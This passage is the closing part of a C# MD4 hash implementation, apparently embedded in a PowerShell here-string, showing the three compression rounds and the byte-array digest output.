                        a = rol(a + f(b, c, d) + chunk[(int)(i + y[4])] + y[12], y[8]);
                        d = rol(d + f(a, b, c) + chunk[(int)(i + y[5])] + y[12], y[9]);
                        c = rol(c + f(d, a, b) + chunk[(int)(i + y[6])] + y[12], y[10]);
                        b = rol(b + f(c, d, a) + chunk[(int)(i + y[7])] + y[12], y[11]);
                    }
                };
                round((x, y, z) => (x & y) | (~x & z), new uint[] { 0, 4, 8, 12, 0, 1, 2, 3, 3, 7, 11, 19, 0 });
                round((x, y, z) => (x & y) | (x & z) | (y & z), new uint[] { 0, 1, 2, 3, 0, 4, 8, 12, 3, 5, 9, 13, 0x5a827999 });
                round((x, y, z) => x ^ y ^ z, new uint[] { 0, 2, 1, 3, 0, 8, 4, 12, 3, 9, 11, 15, 0x6ed9eba1 });
                a += aa; b += bb; c += cc; d += dd;
            }
            // return hex encoded string
            byte[] outBytes = new[] { a, b, c, d }.SelectMany(BitConverter.GetBytes).ToArray();
            return outBytes;
        }
    }
}
"@
